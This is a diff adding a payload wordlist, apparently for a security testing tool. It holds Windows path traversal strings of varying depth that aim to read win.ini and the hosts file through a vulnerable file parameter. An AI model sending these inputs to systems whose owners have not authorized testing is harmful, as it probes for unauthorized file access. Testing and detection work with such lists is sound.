@@ -1,0 +1,36 @@
+# Auto-generated payloads pack (for authorized testing only)
+# DO NOT run these against systems you are not authorized to test.
+
+..\..\..\..\..\..\..\..\..\..\..\nonexistent\dummy.txt
+..\..\..\..\..\..\..\..\..\..\..\windows\system32\drivers\etc\hosts
+..\..\..\..\..\..\..\..\..\..\..\windows\win.ini
+..\..\..\..\..\..\..\..\..\..\nonexistent\dummy.txt
+..\..\..\..\..\..\..\..\..\..\windows\system32\drivers\etc\hosts
+..\..\..\..\..\..\..\..\..\..\windows\win.ini
+..\..\..\..\..\..\..\..\..\nonexistent\dummy.txt
+..\..\..\..\..\..\..\..\..\windows\system32\drivers\etc\hosts
+..\..\..\..\..\..\..\..\..\windows\win.ini
+..\..\..\..\..\..\..\..\nonexistent\dummy.txt
+..\..\..\..\..\..\..\..\windows\system32\drivers\etc\hosts
+..\..\..\..\..\..\..\..\windows\win.ini
+..\..\..\..\..\..\..\nonexistent\dummy.txt
+..\..\..\..\..\..\..\windows\system32\drivers\etc\hosts
+..\..\..\..\..\..\..\windows\win.ini
+..\..\..\..\..\..\nonexistent\dummy.txt
+..\..\..\..\..\..\windows\system32\drivers\etc\hosts
+..\..\..\..\..\..\windows\win.ini
+..\..\..\..\..\nonexistent\dummy.txt
+..\..\..\..\..\windows\system32\drivers\etc\hosts
+..\..\..\..\..\windows\win.ini
+..\..\..\..\nonexistent\dummy.txt
+..\..\..\..\windows\system32\drivers\etc\hosts
+..\..\..\..\windows\win.ini
+..\..\..\nonexistent\dummy.txt
+..\..\..\windows\system32\drivers\etc\hosts
+..\..\..\windows\win.ini
+..\..\nonexistent\dummy.txt
+..\..\windows\system32\drivers\etc\hosts
+..\..\windows\win.ini
+..\nonexistent\dummy.txt
+..\windows\system32\drivers\etc\hosts
+..\windows\win.ini
